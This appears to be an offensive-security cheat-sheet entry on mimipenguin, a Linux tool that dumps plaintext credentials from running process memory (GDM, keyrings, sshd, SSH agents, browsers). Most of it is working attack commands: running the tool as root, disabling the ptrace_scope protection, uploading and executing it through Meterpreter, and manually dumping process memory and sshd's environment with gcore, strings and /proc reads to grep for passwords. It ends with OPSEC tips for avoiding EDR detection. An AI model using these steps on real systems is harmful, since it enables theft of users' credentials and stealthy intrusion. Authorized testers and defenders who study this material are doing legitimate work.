# mimipenguin

**Tags:** `#mimipenguin` `#credentialdumping` `#linux` `#memory` `#pillaging` `#postexploitation`

Linux equivalent of Mimikatz — dumps plaintext credentials from memory on running Linux systems. Reads process memory from services that cache credentials (GDM, KDE Wallet, SSH agents, web browsers, mail clients). Requires root. Available as both a Python script and a Bash script.

**Source:** https://github.com/huntergregal/mimipenguin
**Install:** `git clone https://github.com/huntergregal/mimipenguin`

```bash
# Python version (recommended)
sudo python3 mimipenguin.py

# Bash version (legacy, fewer modules)
sudo bash mimipenguin.sh
```

> [!note] **mimipenguin vs LaZagne on Linux** — LaZagne reads credential files/configs from disk (browser profiles, `.gitconfig`, `.pgpass`). mimipenguin reads live process memory — it can recover credentials from *currently running* sessions even when nothing is stored on disk. Use both: mimipenguin for live session creds, LaZagne for stored credentials.

---

## What It Dumps

mimipenguin targets processes that cache credentials in memory:

| Source | What's Recovered |
|---|---|
| GDM (GNOME Display Manager) | Linux desktop login password |
| KDE Wallet / kwallet | Wallet master password |
| gnome-keyring | Keyring unlock password |
| SSH agent (`ssh-agent`) | Cached SSH passphrases |
| VSFTPd | FTP session credentials |
| Apache2 (htpasswd) | Basic auth credentials |
| OpenSSH (sshd) | Authentication credentials |
| Chromium / Chrome | Saved credentials from memory |

---

## Usage

```bash
# Run everything (Python — most modules)
sudo python3 mimipenguin.py

# Run bash version (fewer targets but no Python dependency)
sudo bash mimipenguin.sh

# Save output to file
sudo python3 mimipenguin.py | tee mimipenguin_out.txt
```

**Example output:**
```
[SYSTEM - GNOME]	user:password123
[SSH]			root:SecurePass!
```

---

## Requirements & Compatibility

- Requires **root** (reads `/proc/<pid>/mem`)
- Works best on older kernels — modern distros with `ptrace_scope=1+` may block memory reads
- Python version requires Python 3
- Target process must be *running* — if GDM has no active session, nothing to dump

```bash
# Check ptrace_scope (0 = unrestricted, 1+ = restricted)
cat /proc/sys/kernel/yama/ptrace_scope

# If restricted and you have root, temporarily allow
echo 0 > /proc/sys/kernel/yama/ptrace_scope

# Check which target processes are running
ps aux | grep -E "gdm|kwallet|gnome-keyring|sshd|vsftpd|apache"
```

---

## From Meterpreter

```bash
# Upload and run
upload mimipenguin.py /tmp/mimipenguin.py
execute -f python3 -a "/tmp/mimipenguin.py" -i -H
```

---

## If mimipenguin Fails

When ptrace is restricted or modern kernel mitigations block memory reads, fall back to manual `/proc` memory reading or other approaches:

```bash
# Manual — dump process memory for a target PID
sudo gcore -o /tmp/gdm_dump <PID>        # requires gdb
strings /tmp/gdm_dump.<PID> | grep -i "password\|pass\|secret"

# Search GDM process memory directly
sudo strings /proc/$(pgrep gdm)/mem 2>/dev/null | grep -A2 -B2 "password"

# grep /proc/*/maps + /proc/*/mem combo (may require custom script)
```

```bash
# Alternative — check for credentials in /proc env / cmdline
sudo cat /proc/$(pgrep sshd)/environ | tr '\0' '\n' | grep -i pass
```

---

## OPSEC Notes

- Reads `/proc/<pid>/mem` — generates read syscalls on sensitive processes, may trigger AV/EDR
- Python script is more capable but also more detectable than the bash version
- On hardened systems (`ptrace_scope >= 1`), execution will fail or produce no output without root + kernel parameter change
- Modern GNOME/KDE no longer cache passwords in recoverable plaintext in many configurations — results vary heavily by distro version

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
